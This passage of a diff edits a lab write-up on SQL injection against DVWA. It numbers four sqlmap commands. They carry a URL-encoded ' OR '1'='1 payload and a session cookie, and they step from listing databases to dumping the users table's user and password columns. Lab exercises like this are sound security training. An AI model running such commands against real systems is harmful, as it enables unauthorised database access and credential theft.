@@ -17,16 +17,16 @@ This lab demonstrates SQL injection testing and database enumeration using SQLMa
 
 ## Commands Used
 ```bash
-  sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
+i) sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
 --cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
 --dbs
-sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
+ii) sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
 --cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
 -D dvwa --tables
- sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
+iii) sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
 --cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
 -D dvwa -T users --columns
- sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
+iv) sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
 --cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
 -D dvwa -T users -C user,password --dump
 
